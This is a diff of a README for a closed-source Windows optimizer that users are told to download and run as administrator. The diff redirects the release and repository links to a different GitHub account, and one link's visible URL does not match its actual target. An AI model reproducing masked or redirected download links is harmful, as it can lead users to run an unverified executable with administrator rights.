@@ -32,7 +32,7 @@ This is a compiled application. The source code is not public. No installation i
 
 ## Usage
 
-1. Download the latest release from the [Releases](https://github.com/Konorze/konorze-windows-performance-optimizer/releases) page.
+1. Download the latest release from the [Releases](https://github.com/patchloop/patchloop-windows-performance-optimizer/releases) page.
 2. Right-click the `.exe` file and choose "Run as administrator".
 3. Use the available tabs to navigate through the tools.
 4. It is recommended to start by creating a restore point.
@@ -66,7 +66,7 @@ This is a proprietary free license, not open-source.
 ## Author
 
 **xpayload**  
-GitHub: [https://github.com/xpayload](https://github.com/xpayload)  
-Repository: [https://github.com/xpayload/xpayload-windows-performance-optimizer](https://github.com/xpayload/xpayload-windows-performance-optimizer)
+GitHub: [https://github.com/xpayload](https://github.com/patchloop)  
+Repository: [https://github.com/patchloop/patchloop-windows-performance-optimizer](https://github.com/patchloop/patchloop-windows-performance-optimizer)
 
 © 2025 xpayload. All rights reserved.
